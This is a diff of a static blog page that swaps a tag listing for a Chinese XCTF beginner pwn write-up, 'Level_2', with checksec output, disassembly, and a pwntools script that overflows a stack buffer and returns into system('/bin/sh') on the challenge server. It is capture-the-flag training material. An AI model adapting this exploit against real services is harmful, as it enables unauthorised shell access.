@@ -20,17 +20,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="天青色等烟雨，而我在等你">
-<meta property="og:type" content="website">
-<meta property="og:title" content="The world of whistleH">
-<meta property="og:url" content="http://example.com/tags/leetcode/index.html">
+  <meta name="description" content="一、Level_2pwn到手第一步，先玩一玩看看.  简单的输入提示，基本上获得不了什么信息。 pwn到手第二步，反手来一个checksec看看一些基本信息。 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x804">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-xctf-新手区wp">
+<meta property="og:url" content="http://example.com/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="天青色等烟雨，而我在等你">
+<meta property="og:description" content="一、Level_2pwn到手第一步，先玩一玩看看.  简单的输入提示，基本上获得不了什么信息。 pwn到手第二步，反手来一个checksec看看一些基本信息。 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x804">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/whistleH/blogImage/blob/main/img/blog1_100/blog0008blog0008_1.png">
+<meta property="article:published_time" content="2022-03-27T11:55:25.000Z">
+<meta property="article:modified_time" content="2022-03-27T12:24:46.356Z">
 <meta property="article:author" content="whistle.H">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="xctf">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/whistleH/blogImage/blob/main/img/blog1_100/blog0008blog0008_1.png">
 
-<link rel="canonical" href="http://example.com/tags/leetcode/">
+<link rel="canonical" href="http://example.com/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/">
 
 
 <script id="page-configurations">
@@ -38,12 +46,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>标签: leetcode | The world of whistleH</title>
+  <title>pwn-xctf-新手区wp | The world of whistleH</title>
   
 
 
@@ -184,71 +192,110 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">leetcode
-          <small>标签</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="whistle.H">
+      <meta itemprop="description" content="天青色等烟雨，而我在等你">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The world of whistleH">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-xctf-新手区wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-27 19:55:25 / 修改时间：20:24:46" itemprop="dateCreated datePublished" datetime="2022-03-27T19:55:25+08:00">2022-03-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/pwn/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2022</span>
-    </div>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-27T18:21:04+08:00"
-              content="2022-03-27">
-          03-27
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/" itemprop="url">
-            <span itemprop="name">leetcode-分治-最接近原点的K个点</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-27T14:30:51+08:00"
-              content="2022-03-27">
-          03-27
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/" itemprop="url">
-            <span itemprop="name">leetcode-分治-为运算表达式设计优先级</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+        <h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
+<p><img src="https://github.com/whistleH/blogImage/blob/main/img/blog1_100/blog0008blog0008_1.png" alt=""></p>
+<p>简单的输入提示，基本上获得不了什么信息。</p>
+<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
+<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
+<p>当ret时，我们回到了call   0x8048320 <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#x40;&#112;&#x6c;&#116;">&#x73;&#x79;&#115;&#x74;&#x65;&#109;&#x40;&#112;&#x6c;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>Python的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
     </div>
-  </div>
-  
-  
-  
 
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/xctf/" rel="tag"># xctf</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/" rel="prev" title="leetcode-分治-最接近原点的K个点">
+      <i class="fa fa-chevron-left"></i> leetcode-分治-最接近原点的K个点
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
@@ -301,6 +348,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Level-2"><span class="nav-text">一、Level_2</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
